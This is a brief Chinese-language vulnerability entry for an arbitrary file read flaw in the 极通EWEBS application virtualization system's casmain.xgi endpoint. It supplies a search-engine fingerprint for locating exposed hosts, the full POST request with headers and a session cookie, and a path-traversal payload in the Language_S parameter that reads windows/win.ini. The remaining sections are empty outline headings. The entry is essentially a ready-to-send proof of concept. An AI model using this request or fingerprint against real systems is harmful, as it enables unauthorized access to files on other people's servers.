# 极通EWEBS应用虚拟化系统casmain.xgi存在任意文件读取漏洞

- **系统**：极通EWEBS应用虚拟化系统casmain.xgi　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app="新软科技-极通EWEBS"`
- **请求**：`POST /casmain.xgi HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Cookie: PHPSESSID=923b86fa90ce1e14c82d4e36d1adc528; CookieLanguageName=ZH-CN`　`Content-Length: 38`

**请求体 / payload**
```
Language_S=../../../../windows/win.ini
```

**其他**
- 极通EWEBS应用虚拟化系统casmain.xgi存在任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 极通EWEBS应用虚拟化系统